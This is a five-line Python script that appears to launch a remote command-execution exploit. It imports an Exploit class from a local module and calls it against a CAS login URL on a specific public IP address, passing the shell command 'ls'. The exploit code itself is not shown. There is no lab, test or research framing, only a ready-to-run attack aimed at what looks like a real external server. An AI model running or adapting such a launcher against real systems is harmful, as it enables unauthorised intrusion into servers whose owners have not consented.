from exp import Exploit

if __name__ == '__main__':
    exp = Exploit("http://120.25.1.53:8080/cas/login", command="ls", )
    exp.exploit()
